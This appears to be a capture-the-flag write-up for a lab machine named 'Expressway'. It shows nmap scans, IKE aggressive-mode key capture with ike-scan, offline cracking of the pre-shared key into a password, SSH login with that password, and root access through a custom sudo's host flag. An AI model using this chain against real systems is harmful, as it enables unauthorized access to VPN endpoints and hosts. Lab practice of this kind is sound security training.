
![[expressway logo.png]]


Let's start with a nmap scan

```
nmap -sVC 10.129.45.68
```

![Résultat nmap TCP](Résultat%20nmap%20TCP.png)

Nothing except ssh, let's start an udp scan

```
nmap -sU 10.129.45.68
```

![Résultat nmap UDP](Résultat%20nmap%20UDP.png)

We notice the port 500 host an IKE (Internet Key Exchange)

So we run the following command

```
ike-scan -A 10.129.45.68
```

![Pasted image 20251007185357](Pasted%20image%2020251007185357.png)

We find the user ``ike@expressway.htb``

Let's try to get his key 

```
ike-scan -A 10.129.45.68 --id ike@expressway.htb -Pike
```
![Pasted image 20251007185558](Pasted%20image%2020251007185558.png)

Now that we got his key, let's crack it

```
psk-crack ike.psk -d `fzf-wordlists`
```
and we get the password "`freakingrockstarontheroad`"

![Pasted image 20251007185744](Pasted%20image%2020251007185744.png)

We can try to use this password for ssh and the user ike

```
ssh ike@10.129.45.68
```

![Pasted image 20251007190002](Pasted%20image%2020251007190002.png)

and we are in

Let's get the user.txt and move forward

First thing first, we run `sudo -l`to see our capabilities

![Pasted image 20251007190130](Pasted%20image%2020251007190130.png)

Looks like a custom sudo because it's not a default response

We run `which sudo` to check

![Pasted image 20251007190214](Pasted%20image%2020251007190214.png)

Bingo

When looking in `/var/log/squid/acces.log.1` we find the host "offramp.expressway.htb"

![Pasted image 20251007190308](Pasted%20image%2020251007190308.png)

when running `sudo --help`, we see a flag -h that allow us to run a command as an host

Let's try to run a command as offramp.expressay.htb which this command

```
sudo -h offramp.expressway.htb /bin/bash
```

![Pasted image 20251007190425](Pasted%20image%2020251007190425.png)

And we are root
